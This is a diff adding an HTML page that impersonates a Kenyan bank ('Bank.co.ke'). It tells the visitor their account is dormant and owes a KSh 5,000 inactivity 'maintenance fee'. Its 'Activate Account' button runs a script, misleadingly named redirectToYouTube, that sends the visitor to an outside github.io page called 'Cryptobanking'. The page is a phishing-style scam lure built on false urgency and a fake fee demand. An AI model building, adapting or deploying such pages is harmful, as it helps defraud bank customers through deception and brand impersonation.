@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Account Reactivation Notice</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:'Poppins', sans-serif;
+    background: linear-gradient(to right, #f8f9fa, #e9ecef);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    background:#ffffff;
+    width:90%;
+    max-width:550px;
+    padding:40px;
+    border-radius:12px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.1);
+    text-align:center;
+}
+
+h1{
+    font-family:'Playfair Display', serif;
+    font-size:26px;
+    margin-bottom:20px;
+    color:#1a1a1a;
+}
+
+.notice{
+    font-size:15px;
+    color:#555;
+    line-height:1.6;
+    margin-bottom:25px;
+}
+
+.amount{
+    background:#f1f3f5;
+    padding:15px;
+    border-radius:8px;
+    margin-bottom:30px;
+    font-weight:500;
+    color:#212529;
+}
+
+.amount span{
+    font-size:18px;
+    font-weight:600;
+    color:#000;
+}
+
+button{
+    padding:12px 28px;
+    border:none;
+    border-radius:30px;
+    background:#25D366;
+    color:white;
+    font-size:15px;
+    cursor:pointer;
+    transition:0.3s ease;
+}
+
+button:hover{
+    background:#1ebe5d;
+}
+
+.demo{
+    margin-top:25px;
+    font-size:13px;
+    color:#888;
+}
+
+footer{
+    position:absolute;
+    bottom:10px;
+    font-size:13px;
+    color:#555;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h1>Account Reactivation Required</h1>
+
+    <p class="notice">
+        Due to long-term account inactivity, your account has been rendered dormant 
+        and temporarily restricted from performing transactions.
+        <br><br>
+        The account has remained inactive for five (5) months.
+        As per maintenance policy, a maintenance fee of 
+        <strong>KSh 1,000 per month</strong> is charged for inactive accounts.
+    </p>
+
+    <div class="amount">
+        Total Maintenance Cost for 5 Months:<br>
+        <span>KSh 5,000</span>
+    </div>
+
+    <button onclick="redirectToYouTube()">Activate Account</button>
+
+</div>
+
+<footer>
+    © 2025 Bank.co.ke. All Rights Reserved.
+</footer>
+
+<script>
+function redirectToYouTube(){
+    window.location.href = "https://cryptobanki28.github.io/Cryptobanking/Cryptobanking 4.html";
+}
+</script>
+
+</body>
+</html>
